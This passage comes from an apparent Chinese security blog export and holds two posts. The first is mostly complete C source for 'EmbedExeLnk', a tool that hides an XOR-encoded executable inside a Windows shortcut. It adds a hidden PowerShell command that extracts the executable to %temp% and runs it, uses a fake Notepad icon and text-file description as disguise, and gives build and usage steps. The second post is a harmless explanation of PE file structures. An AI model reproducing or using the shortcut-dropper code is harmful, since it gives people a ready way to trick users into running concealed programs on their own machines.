ShellLinkHeader; EnvironmentVariableDataBlockStruct EnvironmentVariableDataBlock; DWORD dwBytesWritten = 0; WORD wLinkDescriptionLength = 0; wchar_t wszLinkDescription[512]; WORD wCommandLineArgumentsLength = 0; wchar_t wszCommandLineArguments[8192]; WORD wIconLocationLength = 0; wchar_t wszIconLocation[512]; BYTE bExeDataBuffer[1024]; DWORD dwBytesRead = 0; DWORD dwEndOfLinkPosition = 0; DWORD dwCommandLineArgsStartPosition = 0; wchar_t *pCmdLinePtr = NULL; wchar_t wszOverwriteSkipBytesValue[16]; wchar_t wszOverwriteSearchLnkFileSizeValue[16]; BYTE bXorEncryptValue = 0; DWORD dwTotalFileSize = 0; // set xor encrypt value bXorEncryptValue = 0x77; // create link file hLinkFile = CreateFile(pOutputLinkPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (hLinkFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;Failed to create output file\\n&quot;); return 1; &#125; // initialise link header memset((void *)&amp;ShellLinkHeader, 0, sizeof(ShellLinkHeader)); ShellLinkHeader.dwHeaderSize = sizeof(ShellLinkHeader); CLSIDFromString(L&quot;&#123;00021401-0000-0000-C000-000000000046&#125;&quot;, &amp;ShellLinkHeader.LinkCLSID); ShellLinkHeader.dwLinkFlags = HasArguments | HasExpString | PreferEnvironmentPath | IsUnicode | HasName | HasIconLocation; ShellLinkHeader.dwFileAttributes = 0; ShellLinkHeader.CreationTime.dwHighDateTime = 0; ShellLinkHeader.CreationTime.dwLowDateTime = 0; ShellLinkHeader.AccessTime.dwHighDateTime = 0; ShellLinkHeader.AccessTime.dwLowDateTime = 0; ShellLinkHeader.WriteTime.dwHighDateTime = 0; ShellLinkHeader.WriteTime.dwLowDateTime = 0; ShellLinkHeader.dwFileSize = 0; ShellLinkHeader.dwIconIndex = 0; ShellLinkHeader.dwShowCommand = SW_SHOWMINNOACTIVE; ShellLinkHeader.wHotKey = 0; // write ShellLinkHeader if (WriteFile(hLinkFile, (void *)&amp;ShellLinkHeader, sizeof(ShellLinkHeader), &amp;dwBytesWritten, NULL) == 0) &#123; // error CloseHandle(hLinkFile); return 1; &#125; // set link description memset(wszLinkDescription, 0, sizeof(wszLinkDescription)); mbstowcs(wszLinkDescription, pLinkDescription, (sizeof(wszLinkDescription) / sizeof(wchar_t)) - 1); wLinkDescriptionLength = (WORD)wcslen(wszLinkDescription); // write LinkDescriptionLength if (WriteFile(hLinkFile, (void *)&amp;wLinkDescriptionLength, sizeof(WORD), &amp;dwBytesWritten, NULL) == 0) &#123; // error CloseHandle(hLinkFile); return 1; &#125; // write LinkDescription if (WriteFile(hLinkFile, (void *)wszLinkDescription, wLinkDescriptionLength * sizeof(wchar_t), &amp;dwBytesWritten, NULL) == 0) &#123; // error CloseHandle(hLinkFile); return 1; &#125; // set target command-line memset(wszCommandLineArguments, 0, sizeof(wszCommandLineArguments)); _snwprintf(wszCommandLineArguments, (sizeof(wszCommandLineArguments) / sizeof(wchar_t)) - 1, L&quot;%512S/c powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object &#123;$_.length -eq 0x00000000&#125; ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) &#123; $file[$i] = $file[$i] -bxor 0x%02X &#125;; $path = &#x27;%%temp%%\\\\tmp&#x27; + (Get-Random) + &#x27;.exe&#x27;; sc $path ([byte[]]($file ^| select -Skip 000000)) -Encoding Byte; ^&amp; $path;&quot;, &quot;&quot;, bXorEncryptValue); wCommandLineArgumentsLength = (WORD)wcslen(wszCommandLineArguments); // write CommandLineArgumentsLength if (WriteFile(hLinkFile, (void *)&amp;wCommandLineArgumentsLength, sizeof(WORD), &amp;dwBytesWritten, NULL) == 0) &#123; // error CloseHandle(hLinkFile); return 1; &#125; // store start of command-line arguments position dwCommandLineArgsStartPosition = GetFileSize(hLinkFile, NULL); // write CommandLineArguments if (WriteFile(hLinkFile, (void *)wszCommandLineArguments, wCommandLineArgumentsLength * sizeof(wchar_t), &amp;dwBytesWritten, NULL) == 0) &#123; // error CloseHandle(hLinkFile); return 1; &#125; // set link icon path memset(wszIconLocation, 0, sizeof(wszIconLocation)); mbstowcs(wszIconLocation, pLinkIconPath, (sizeof(wszIconLocation) / sizeof(wchar_t)) - 1); wIconLocationLength = (WORD)wcslen(wszIconLocation); // write IconLocationLength if (WriteFile(hLinkFile, (void *)&amp;wIconLocationLength, sizeof(WORD), &amp;dwBytesWritten, NULL) == 0) &#123; // error CloseHandle(hLinkFile); return 1; &#125; // write IconLocation if (WriteFile(hLinkFile, (void *)wszIconLocation, wIconLocationLength * sizeof(wchar_t), &amp;dwBytesWritten, NULL) == 0) &#123; // error CloseHandle(hLinkFile); return 1; &#125; // initialise environment variable data block memset((void *)&amp;EnvironmentVariableDataBlock, 0, sizeof(EnvironmentVariableDataBlock)); EnvironmentVariableDataBlock.dwBlockSize = sizeof(EnvironmentVariableDataBlock); EnvironmentVariableDataBlock.dwBlockSignature = 0xA0000001; strncpy(EnvironmentVariableDataBlock.szTargetAnsi, &quot;%windir%\\\\system32\\\\cmd.exe&quot;, sizeof(EnvironmentVariableDataBlock.szTargetAnsi) - 1); mbstowcs(EnvironmentVariableDataBlock.wszTargetUnicode, EnvironmentVariableDataBlock.szTargetAnsi, (sizeof(EnvironmentVariableDataBlock.wszTargetUnicode) / sizeof(wchar_t)) - 1); // write EnvironmentVariableDataBlock if (WriteFile(hLinkFile, (void *)&amp;EnvironmentVariableDataBlock, sizeof(EnvironmentVariableDataBlock), &amp;dwBytesWritten, NULL) == 0) &#123; // error CloseHandle(hLinkFile); return 1; &#125; // store end of link data position dwEndOfLinkPosition = GetFileSize(hLinkFile, NULL); // open target exe file hExeFile = CreateFile(pExePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hExeFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;Failed to open exe file\\n&quot;); // error CloseHandle(hLinkFile); return 1; &#125; // append exe file to the end of the lnk file for (;;) &#123; // read data from exe file if (ReadFile(hExeFile, bExeDataBuffer, sizeof(bExeDataBuffer), &amp;dwBytesRead, NULL) == 0) &#123; // error CloseHandle(hExeFile); CloseHandle(hLinkFile); return 1; &#125; // check for end of file if (dwBytesRead == 0) &#123; break; &#125; // &quot;encrypt&quot; the exe file data for (DWORD i = 0; i &lt; dwBytesRead; i++) &#123; bExeDataBuffer[i] ^= bXorEncryptValue; &#125; // write data to lnk file if (WriteFile(hLinkFile, bExeDataBuffer, dwBytesRead, &amp;dwBytesWritten, NULL) == 0) &#123; // error CloseHandle(hExeFile); CloseHandle(hLinkFile); return 1; &#125; &#125; // close exe file handle CloseHandle(hExeFile); // store total file size dwTotalFileSize = GetFileSize(hLinkFile, NULL); // find the offset value of the number of bytes to skip in the command-line arguments pCmdLinePtr = wcsstr(wszCommandLineArguments, L&quot;select -Skip 000000)&quot;); if (pCmdLinePtr == NULL) &#123; // error CloseHandle(hLinkFile); return 1; &#125; pCmdLinePtr += strlen(&quot;select -Skip &quot;); // move the file pointer back to the &quot;000000&quot; value in the command-line arguments if (SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE *)pCmdLinePtr - (BYTE *)wszCommandLineArguments), NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) &#123; // error CloseHandle(hLinkFile); return 1; &#125; // overwrite link file size memset(wszOverwriteSkipBytesValue, 0, sizeof(wszOverwriteSkipBytesValue)); _snwprintf(wszOverwriteSkipBytesValue, (sizeof(wszOverwriteSkipBytesValue) / sizeof(wchar_t)) - 1, L&quot;%06u&quot;, dwEndOfLinkPosition); if (WriteFile(hLinkFile, (void *)wszOverwriteSkipBytesValue, wcslen(wszOverwriteSkipBytesValue) * sizeof(wchar_t), &amp;dwBytesWritten, NULL) == 0) &#123; // error CloseHandle(hLinkFile); return 1; &#125; // find the offset value of the total lnk file length in the command-line arguments pCmdLinePtr = wcsstr(wszCommandLineArguments, L&quot;_.length -eq 0x00000000&#125;&quot;); if (pCmdLinePtr == NULL) &#123; // error CloseHandle(hLinkFile); return 1; &#125; pCmdLinePtr += strlen(&quot;_.length -eq &quot;); // move the file pointer back to the &quot;0x00000000&quot; value in the command-line arguments if (SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE *)pCmdLinePtr - (BYTE *)wszCommandLineArguments), NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) &#123; // error CloseHandle(hLinkFile); return 1; &#125; // overwrite link file size memset(wszOverwriteSearchLnkFileSizeValue, 0, sizeof(wszOverwriteSearchLnkFileSizeValue)); _snwprintf(wszOverwriteSearchLnkFileSizeValue, (sizeof(wszOverwriteSearchLnkFileSizeValue) / sizeof(wchar_t)) - 1, L&quot;0x%08X&quot;, dwTotalFileSize); if (WriteFile(hLinkFile, (void *)wszOverwriteSearchLnkFileSizeValue, wcslen(wszOverwriteSearchLnkFileSizeValue) * sizeof(wchar_t), &amp;dwBytesWritten, NULL) == 0) &#123; // error CloseHandle(hLinkFile); return 1; &#125; // close output file handle CloseHandle(hLinkFile); return 0;&#125;int main(int argc, char *argv[])&#123; char *pExePath = NULL; char *pOutputLinkPath = NULL; printf(&quot;EmbedExeLnk - www.x86matthew.com\\n\\n&quot;); if (argc != 3) &#123; printf(&quot;Usage: %s [exe_path] [output_lnk_path]\\n\\n&quot;, argv[0]); return 1; &#125; // get params pExePath = argv[1]; pOutputLinkPath = argv[2]; // create a link file containing the target exe if (CreateLinkFile(pExePath, pOutputLinkPath, &quot;%windir%\\\\system32\\\\notepad.exe&quot;, &quot;Type: Text Document\\nSize: 5.23 KB\\nDate modified: 01/02/2020 11:23&quot;) != 0) &#123; printf(&quot;Error\\n&quot;); return 1; &#125; printf(&quot;Finished\\n&quot;); return 0;&#125; 解决报错项目-&gt;属性-&gt;高级-&gt;字符集改为未设置 项目-&gt;属性-&gt;C/C++-&gt;语言-&gt;符合模式改为否 项目-&gt;属性-&gt;C/C++-&gt;语言-&gt;预处理器-&gt;预处理器定义-&gt;编辑-&gt;新增一行：_CRT_SECURE_NO_WARNINGS 生成lnk文件在工程文件目录的Debug文件夹找到生成的exe文件 Win + R，输入%temp%打开存放临时文件的目录 点击修改日期，将文件改为以创建时间排序，方便观察效果 打开cmd，定位到生成的exe文件目录，输入指令 1编译生成的文件名.exe [需要捆绑的exe文件地址] [lnk文件名] 在exe目录下生成lnk文件，双击lnk文件，捆绑的exe文件执行成功并且以随机数命名保存在了%temp%目录下","tags":"捆绑"},{"title":"PE结构简述","url":"/post/15941cfe.html","text":"LordPE下载 MS-DOS头：兼容性，在DOS系统下提示无法运行 12345678910111213141516171819202122// 直接在VS里面输_IMAGE_DOS_HEADER然后CTRL点击即可看到结构定义，19个字段，重点关注第一个和最后一个typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // MS-DOS头的标志MZ，固定为4D 5A，实际值为0x5A4D WORD e_cblp; // 文件末页的字节数 WORD e_cp; // 文件页数 WORD e_crlc; // 重定位 WORD e_cparhdr; // 区段中头部的大小 WORD e_minalloc; // 最小附加内存段的需求 WORD e_maxalloc; // 最大附加内存段的需求 WORD e_ss; // 初始SS值，用于初始化堆栈 WORD e_sp; // 初始SP值，用于初始化堆栈指针的值 WORD e_csum; // 校验和 WORD e_ip; // 初始化IP寄存器的值，即程序的入口点 WORD e_cs; // 初始化CS的值，CS:IP WORD e_lfarlc; // 重定位表的偏移 WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM厂商的标识 WORD e_oeminfo; // OEM厂商的信息 WORD e_res2[10]; // Reserved words LONG e_lfanew; // 4个字节，偏移为37，指向新的PE头，因为这是DOS头，是为了兼容DOS系统，真正执行需要到PE头 &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; 编辑器：低地址存放低位数据，小端存储 注意编辑器行号的进制要变为16进制而不是十进制，偏移是十六进制的数据呀！ PE头看清程序是32/64位 标准PE头(每个PE文件都有)和扩展PE头(可有可无) 123456// 32位typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; // PE标识：PE-&gt;50 45 00 00，实际值为0x00004550 IMAGE_FILE_HEADER FileHeader; // 标准NT头 IMAGE_OPTIONAL_HEADER32 OptionalHeader; // 扩展头，可选&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 123456// 64位typedef struct _IMAGE_NT_HEADERS64 &#123; DWORD Signature; // PE标识：PE-&gt;50 45 00 00，实际值为0x00004550 IMAGE_FILE_HEADER FileHeader; // 标准NT头 IMAGE_OPTIONAL_HEADER64 OptionalHeader; // 可选&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; 12345678910// 标准NT头typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; // 运行平台，指明可运行的处理器平台 WORD NumberOfSections; // 区段数量，.text、.rdata、.data...可用于遍历区段 DWORD TimeDateStamp; // 文件创建时间戳 DWORD PointerToSymbolTable; // 指向符号表的指针，没什么用了 DWORD NumberOfSymbols; // 符号表中符号的数量 WORD SizeOfOptionalHeader; // 扩展头的大小 WORD Characteristics; // PE文件的属性，exe：0x010F，dll：0x0210&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546//// Optional header format.//typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // WORD Magic; // 文件类型的标识，普通可执行文件：0x10B BYTE MajorLinkerVersion; // 链接器的主版本号 BYTE MinorLinkerVersion; // 链接器的子版本号 DWORD SizeOfCode; // 按磁盘扇区的整倍数计算 DWORD SizeOfInitializedData; // 已初始化的数据块的大小 DWORD SizeOfUninitializedData; // 未初始化的数据块的大小 DWORD AddressOfEntryPoint; // 程序入口的RVA(相对虚拟地址) DWORD BaseOfCode; // 代码段的起始RVA，一般为0x1000 DWORD BaseOfData; // 数据段的起始RVA，一般位于代码段之后 // // NT additional fields. // DWORD ImageBase; // 程序的首选装载地址，Windows优先将文件装入到由ImageBase字段指定的地址中 DWORD SectionAlignment; // 内存中的区块的对齐大小 DWORD FileAlignment; // 文件中的区块的对齐大小 WORD MajorOperatingSystemVersion; // 要求操作系统最低版本号的主版本号 WORD MinorOperatingSystemVersion; // 要求操作系统最低版本号的子版本号 WORD MajorImageVersion; // 可运行于操作系统的主版本号 WORD MinorImageVersion; // 可运行于操作系统的子版本号 WORD MajorSubsystemVersion; // 要求最低子系统版本的主版本号 WORD MinorSubsystemVersion; // 要求最低子系统版本子主版本号 DWORD Win32VersionValue; // 保留值，必须为0 DWORD SizeOfImage; // 映像装入内存后的总尺寸 DWORD SizeOfHeaders; // 所有头(DOS头、PE头) + 区块表的尺寸大小 DWORD CheckSum; // 映像文件的校验和 WORD Subsystem; // 可执行文件期望的子系统 WORD DllCharacteristics; // DllMain()函数何时被调用，默认为 0 DWORD SizeOfStackReserve; // 初始化时的栈大小 DWORD SizeOfStackCommit; // 初始化时实际提交的栈大小 DWORD SizeOfHeapReserve; // 初始化时保留的堆大小 DWORD SizeOfHeapCommit; // 初始化时实际提交的堆大小 DWORD LoaderFlags; // 与调试有关，默认为 0 DWORD NumberOfRvaAndSizes; // 下边数据目录的项数，这个字段自Windows NT 发布以来一直是16 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; // 数据目录表&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 1234常用的三种地址：VA：虚拟内存地址，00000000~0FFFFFFFh，等于进程的基址+相对虚拟内存地址RVA：相对虚拟内存地址，记录模块相对于基址的偏移FOA：File Offset Address，文件偏移地址，某个位置距离文件头(MZ)的偏移 123456// 各种标志的值，重点关注MZ和PE00#define IMAGE_DOS_SIGNATURE 0x5A4D // MZ#define IMAGE_OS2_SIGNATURE 0x454E // NE#define IMAGE_OS2_SIGNATURE_LE 0x454C // LE#define IMAGE_VXD_SIGNATURE 0x454C // LE#define IMAGE_NT_SIGNATURE 0x00004550 // PE00 1234567891011121314151617181920212223242526272829303132// 运行平台的宏#define IMAGE_FILE_MACHINE_TARGET_HOST 0x0001 // Useful for indicating we want to interact with the host and not a WoW guest.#define IMAGE_FILE_MACHINE_I386 0x014c // Intel 386.#define IMAGE_FILE_MACHINE_R3000 0x0162 // MIPS little-endian, 0x160 big-endian#define IMAGE_FILE_MACHINE_R4000 0x0166 // MIPS little-endian#define IMAGE_FILE_MACHINE_R10000 0x0168 // MIPS little-endian#define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169 // MIPS little-endian WCE v2#define IMAGE_FILE_MACHINE_ALPHA 0x0184 // Alpha_AXP#define IMAGE_FILE_MACHINE_SH3 0x01a2 // SH3 little-endian#define IMAGE_FILE_MACHINE_SH3DSP 0x01a3#define IMAGE_FILE_MACHINE_SH3E 0x01a4 // SH3E little-endian#define IMAGE_FILE_MACHINE_SH4 0x01a6 // SH4 little-endian#define IMAGE_FILE_MACHINE_SH5 0x01a8 // SH5#define IMAGE_FILE_MACHINE_ARM 0x01c0 // ARM Little-Endian#define IMAGE_FILE_MACHINE_THUMB 0x01c2 // ARM Thumb/Thumb-2 Little-Endian#define IMAGE_FILE_MACHINE_ARMNT 0x01c4 // ARM Thumb-2 Little-Endian#define IMAGE_FILE_MACHINE_AM33 0x01d3#define IMAGE_FILE_MACHINE_POWERPC 0x01F0 // IBM PowerPC Little-Endian#define IMAGE_FILE_MACHINE_POWERPCFP 0x01f1#define IMAGE_FILE_MACHINE_IA64 0x0200 // Intel 64#define IMAGE_FILE_MACHINE_MIPS16 0x0266 // MIPS#define IMAGE_FILE_MACHINE_ALPHA64 0x0284 // ALPHA64#define IMAGE_FILE_MACHINE_MIPSFPU 0x0366 // MIPS#define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466 // MIPS#define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64#define IMAGE_FILE_MACHINE_TRICORE 0x0520 // Infineon#define IMAGE_FILE_MACHINE_CEF 0x0CEF#define IMAGE_FILE_MACHINE_EBC 0x0EBC // EFI Byte Code#define IMAGE_FILE_MACHINE_AMD64 0x8664 // AMD64 (K8)#define IMAGE_FILE_MACHINE_M32R 0x9041 // M32R little-endian#define IMAGE_FILE_MACHINE_ARM64 0xAA64 // ARM64 Little-Endian#define IMAGE_FILE_MACHINE_CEE 0xC0EE 12345678910111213141516// 常见PE属性#define IMAGE_FILE_RELOCS_STRIPPED 0x0001 // Relocation info stripped from file.#define IMAGE_FILE_EXECUTABLE_IMAGE 0x0002 // File is executable (i.e. no unresolved external references).#define IMAGE_FILE_LINE_NUMS_STRIPPED 0x0004 // Line nunbers stripped from file.#define IMAGE_FILE_LOCAL_SYMS_STRIPPED 0x0008 // Local symbols stripped from file.#define IMAGE_FILE_AGGRESIVE_WS_TRIM 0x0010 // Aggressively trim working set#define IMAGE_FILE_LARGE_ADDRESS_AWARE 0x0020 // App can handle &gt;2gb addresses#define IMAGE_FILE_BYTES_REVERSED_LO 0x0080 // Bytes of machine word are reversed.#define IMAGE_FILE_32BIT_MACHINE 0x0100 // 32 bit word machine.#define IMAGE_FILE_DEBUG_STRIPPED 0x0200 // Debugging info stripped from file in .DBG file#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP 0x0400 // If Image is on removable media, copy and run from the swap file.#define IMAGE_FILE_NET_RUN_FROM_SWAP 0x0800 // If Image is on Net, copy and run from the swap file.#define IMAGE_FILE_SYSTEM 0x1000 // System File.#define IMAGE_FILE_DLL 0x2000 // File is a DLL.#define IMAGE_FILE_UP_SYSTEM_ONLY 0x4000 // File should only be run on a UP machine#define IMAGE_FILE_BYTES_REVERSED_HI 0x8000 // Bytes of machine word are reversed. 12345678910111213141516// 可执行文件期望的子系统的值#define IMAGE_SUBSYSTEM_UNKNOWN 0 // Unknown subsystem.#define IMAGE_SUBSYSTEM_NATIVE 1 // Image doesn&#x27;t require a subsystem.#define IMAGE_SUBSYSTEM_WINDOWS_GUI 2 // Image runs in the Windows GUI subsystem.#define IMAGE_SUBSYSTEM_WINDOWS_CUI 3 // Image runs in the Windows character subsystem.#define IMAGE_SUBSYSTEM_OS2_CUI 5 // image runs in the OS/2 character subsystem.#define IMAGE_SUBSYSTEM_POSIX_CUI 7 // image runs in the Posix character subsystem.#define IMAGE_SUBSYSTEM_NATIVE_WINDOWS 8 // image is a native Win9x driver.#define IMAGE_SUBSYSTEM_WINDOWS_CE_GUI 9 // Image runs in the Windows CE subsystem.#define IMAGE_SUBSYSTEM_EFI_APPLICATION 10 //#define IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER 11 //#define IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER 12 //#define IMAGE_SUBSYSTEM_EFI_ROM 13#define IMAGE_SUBSYSTEM_XBOX 14#define IMAGE_SUBSYSTEM_WINDOWS_BOOT_APPLICATION 16#define IMAGE_SUBSYSTEM_XBOX_CODE_CATALOG 17 区段区段表： 常用区段： .text / .code：代码段 .data：可读写的数据段，存放全局变量和静态变量 .rdata：只读数据段 .idata：存放导入表信息 .edata：存放导出表信息 .rsrc：资源段 .bss：未初始化的数据 .crt：用于C++ 运行时(CRT)所添加的数据 .tls：TLS是线程局部存储器，用于支持通过_declspec(thread)声明的线程局部存储变量的数据，这包括数据的初始化值，也包括运行时所需要的额外变量 .reloc：可执行文件的基址重定位，基址重定位一般仅Dll需要的 .sdata：相对于全局指针的可被定位的 短的读写数据 .pdata：异常表,包含CPU特定的IAMGE_RUNTIME_FUNTION_ENTRY结构数组，DataDirectory中的IMAGE_DIRECTORY_ENTRY_EXCEPTION指向它. .didata：延迟装入输入数据，在非Release模式下可以找到 12345678910111213141516// 每一个区段都是这样一个结构typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 区段名 union &#123; DWORD PhysicalAddress; DWORD VirtualSize; // 区段对其之前的实际大小 &#125; Misc; DWORD VirtualAddress; // 区段载入内存后的RVA，按内存页对齐 DWORD SizeOfRawData; // 磁盘中的大小，按文件页对齐 DWORD PointerToRawData; // 区段在文件中的偏移 DWORD PointerToRelocations; // 区段重定位表的偏移地址 DWORD PointerToLinenumbers; // 行号表在文件中的偏移 WORD NumberOfRelocations; // 区段重定位表的表项个数 WORD NumberOfLinenumbers; // 行号表项的数量 DWORD Characteristics; // 区段属性&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455//// 区段属性//// IMAGE_SCN_TYPE_REG 0x00000000 // Reserved.// IMAGE_SCN_TYPE_DSECT 0x00000001 // Reserved.// IMAGE_SCN_TYPE_NOLOAD 0x00000002 // Reserved.// IMAGE_SCN_TYPE_GROUP 0x00000004 // Reserved.#define IMAGE_SCN_TYPE_NO_PAD 0x00000008 // Reserved.// IMAGE_SCN_TYPE_COPY 0x00000010 // Reserved.#define IMAGE_SCN_CNT_CODE 0x00000020 // Section contains code.#define IMAGE_SCN_CNT_INITIALIZED_DATA 0x00000040 // Section contains initialized data.#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080 // Section contains uninitialized data.#define IMAGE_SCN_LNK_OTHER 0x00000100 // Reserved.#define IMAGE_SCN_LNK_INFO 0x00000200 // Section contains comments or some other type of information.// IMAGE_SCN_TYPE_OVER 0x00000400 // Reserved.#define IMAGE_SCN_LNK_REMOVE 0x00000800 // Section contents will not become part of image.#define IMAGE_SCN_LNK_COMDAT 0x00001000 // Section contents comdat.// 0x00002000 // Reserved.// IMAGE_SCN_MEM_PROTECTED - Obsolete 0x00004000#define IMAGE_SCN_NO_DEFER_SPEC_EXC 0x00004000 // Reset speculative exceptions handling bits in the TLB entries for this section.#define IMAGE_SCN_GPREL 0x00008000 // Section content can be accessed relative to GP#define IMAGE_SCN_MEM_FARDATA 0x00008000// IMAGE_SCN_MEM_SYSHEAP - Obsolete 0x00010000#define IMAGE_SCN_MEM_PURGEABLE 0x00020000#define IMAGE_SCN_MEM_16BIT 0x00020000#define IMAGE_SCN_MEM_LOCKED 0x00040000#define IMAGE_SCN_MEM_PRELOAD 0x00080000#define IMAGE_SCN_ALIGN_1BYTES 0x00100000 //#define IMAGE_SCN_ALIGN_2BYTES 0x00200000 //#define IMAGE_SCN_ALIGN_4BYTES 0x00300000 //#define IMAGE_SCN_ALIGN_8BYTES 0x00400000 //#define IMAGE_SCN_ALIGN_16BYTES 0x00500000 // Default alignment if no others are specified.#define IMAGE_SCN_ALIGN_32BYTES 0x00600000 //#define IMAGE_SCN_ALIGN_64BYTES 0x00700000 //#define IMAGE_SCN_ALIGN_128BYTES 0x00800000 //#define IMAGE_SCN_ALIGN_256BYTES 0x00900000 //#define IMAGE_SCN_ALIGN_512BYTES 0x00A00000 //#define IMAGE_SCN_ALIGN_1024BYTES 0x00B00000 //#define IMAGE_SCN_ALIGN_2048BYTES 0x00C00000 //#define IMAGE_SCN_ALIGN_4096BYTES 0x00D00000 //#define IMAGE_SCN_ALIGN_8192BYTES 0x00E00000 //// Unused 0x00F00000#define IMAGE_SCN_ALIGN_MASK 0x00F00000#define IMAGE_SCN_LNK_NRELOC_OVFL 0x01000000 // Section contains extended relocations.#define IMAGE_SCN_MEM_DISCARDABLE 0x02000000 // Section can be discarded.#define IMAGE_SCN_MEM_NOT_CACHED 0x04000000 // Section is not cachable.#define IMAGE_SCN_MEM_NOT_PAGED 0x08000000 // Section is not pageable.#define IMAGE_SCN_MEM_SHARED 0x10000000 // Section is shareable.#define IMAGE_SCN_MEM_EXECUTE 0x20000000 // Section is executable.#define IMAGE_SCN_MEM_READ 0x40000000 // Section is readable.#define IMAGE_SCN_MEM_WRITE 0x80000000 // Section is writeable. 数据目录表1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; // 虚拟地址 DWORD Size; // 尺寸&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 1234567891011121314151617// 目录顺序#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory#define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory#define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory#define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table#define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory// IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage)#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data，保留字段，必须为0#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP#define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers#define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor 123456789101112131415typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // 即INT的RVA &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real date\\time stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; // 动态链接库的名称(kernel32.dll)的RVA DWORD FirstThunk; // 即IAT的RVA&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; 123456789typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; // PBYTE DWORD Function; // PDWORD DWORD Ordinal; DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME，指向IMAGE_IMPORT_BY_NAME结构 &#125; u1;&#125; IMAGE_THUNK_DATA32;typedef IMAGE_THUNK_DATA32 *PIMAGE_THUNK_DATA32; 1234typedef struct _IMAGE_IMPORT_BY_NAME &#123; WORD Hint; // 需要导入函数的函数序号 CHAR Name[1]; // 需要导入函数的函数名&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; 导出表12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; // 保留段，一直为0 DWORD TimeDateStamp; // 创建时间 WORD MajorVersion; WORD MinorVersion; DWORD Name; // 指向模块名的RVA DWORD Base; // 输出API函数的索引值的基数(1) DWORD NumberOfFunctions; // 导出函数个数 DWORD NumberOfNames; // 导出函数名个数，很多函数没有函数名 DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 重定位表主要用于动态链接库 123456typedef struct _IMAGE_BASE_RELOCATION &#123; DWORD VirtualAddress; // 需要重定位的RVA，一般为0x1000的倍数 DWORD SizeOfBlock; // 结构体和数组TypeOffset的体积总和 // WORD TypeOffset[1];&#125; 